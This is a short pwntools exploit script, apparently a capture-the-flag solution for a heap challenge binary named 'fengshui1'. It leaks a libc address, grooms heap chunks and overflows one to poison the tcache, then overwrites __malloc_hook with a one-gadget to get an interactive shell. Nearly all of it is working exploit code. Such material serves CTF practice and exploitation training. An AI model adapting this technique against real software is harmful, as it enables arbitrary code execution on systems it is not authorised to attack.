# fengshui1.py
from pwn import *
p = process("./fengshui1")
def add(size):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(size))
def delete(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def edit(idx,data):
	print p.sendlineafter(">","3")
	print p.sendlineafter(":",str(idx))
	print p.sendlineafter(":",str(data))
def show(idx):
	print p.sendlineafter(">","4")
	print p.sendlineafter(":",str(idx))

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# tcache escape main_arena leak
add(0x10) # 0 
add(0x1000) # 1
add(0x1000) # 2
delete(1)
add(0x1000) # 3
show(3)
print p.recvuntil("Data: ")
libc_leak = u64(p.recv(6).ljust(8,"\x00"))
libc_base = libc_leak - 0x3ebca0
malloc_hook = libc_base + libc.symbols['__malloc_hook']
oneshot = libc_base + 0x10a45c
print hex(libc_leak)
print hex(libc_base)

# heap fengshui & overflow
add(32) # 4
add(32) # 5
add(32) # 6
pause()
delete(6)
delete(4)
add(32) # 7
payload = "A"*32
payload += p64(0)
payload += p64(0x31)
payload += "A"*32
payload += p64(0)
payload += p64(0x31)
payload += p64(malloc_hook)
edit(7, payload)
add(32) # 8
add(32) # 9
edit(9,p64(oneshot))
add(32)
p.interactive()
